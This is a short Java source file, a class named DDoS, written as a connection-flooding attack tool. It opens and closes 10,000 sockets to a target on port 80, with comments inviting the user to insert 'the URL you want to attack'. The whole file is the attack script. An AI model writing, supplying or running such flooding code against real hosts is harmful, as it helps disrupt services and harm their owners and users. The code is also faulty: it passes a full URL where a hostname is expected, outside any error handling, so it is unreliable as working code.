package xxx.com.network;

import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;

public class DDoS {

  public static void main(String[] args) throws IOException {
    String target = "http://www.example.com"; // Replace with the URL you want to attack

    int port = 80; // Replace with the port number you want to use
    InetAddress address = InetAddress.getByName(target);

    try {
      for (int i = 0; i < 10000; i++) {
        Socket socket = new Socket(address, port);
        socket.close();
      }
    } catch (IOException e) {
      System.out.println("Error: " + e.getMessage());
    }
  }
}
